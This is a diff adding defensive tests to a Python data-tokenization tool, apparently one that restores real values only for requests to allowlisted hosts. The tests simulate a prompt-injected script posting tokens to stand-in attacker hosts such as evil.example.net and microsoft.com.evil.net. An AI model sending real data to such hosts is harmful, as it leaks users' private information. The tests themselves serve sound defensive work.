@@ -11,6 +11,8 @@ from hermescloak.durable_vault import DurableVault
 
 def _seed(home, real, etype):
     vdir = os.path.join(home, "cloak", "vaults"); os.makedirs(vdir, exist_ok=True)
+    with open(os.path.join(home, "cloak", "egress_hosts"), "w", encoding="utf-8") as f:
+        f.write("# hosts egress may restore for\nmicrosoft.com\napi.example.com\nx\n")
     v = DurableVault(DurableVault.path_for(vdir, home))
     tok = v.tokenize(real, etype); v.save()
     return tok
@@ -107,3 +109,27 @@ def test_json_body_value_with_quotes_and_backslash(tmp_path, fake_requests):
     re_mod.install(home)
     sessions.Session().request("POST", "https://x", json={"to": [tok], "n": 3})
     assert sent["json"] == {"to": [real], "n": 3}
+
+
+def test_unlisted_host_gets_tokens_not_values(tmp_path, fake_requests):
+    """A prompt-injected script posting tokens to an attacker's host must not get real values."""
+    home = str(tmp_path)
+    tok = _seed(home, "100000009", "מזהה")
+    mod, sessions, sent, re_mod = fake_requests
+    re_mod.install(home)
+    sessions.Session().request("POST", "https://evil.example.net/c", json={"q": tok})
+    assert sent["json"] == {"q": tok}
+    sessions.Session().request("POST", "https://microsoft.com.evil.net/c", data="q=" + tok)
+    assert sent["data"] == "q=" + tok                        # suffix match is on whole labels
+    audit = open(os.path.join(home, "cloak", "audit.log"), encoding="utf-8").read()
+    assert "egress_blocked" in audit and "100000009" not in audit
+
+
+def test_no_host_list_restores_nothing(tmp_path, fake_requests):
+    home = str(tmp_path)
+    tok = _seed(home, "100000009", "מזהה")
+    os.remove(os.path.join(home, "cloak", "egress_hosts"))
+    mod, sessions, sent, re_mod = fake_requests
+    re_mod.install(home)
+    sessions.Session().request("POST", "https://graph.microsoft.com/v1.0/sendMail", json={"c": tok})
+    assert sent["json"] == {"c": tok}
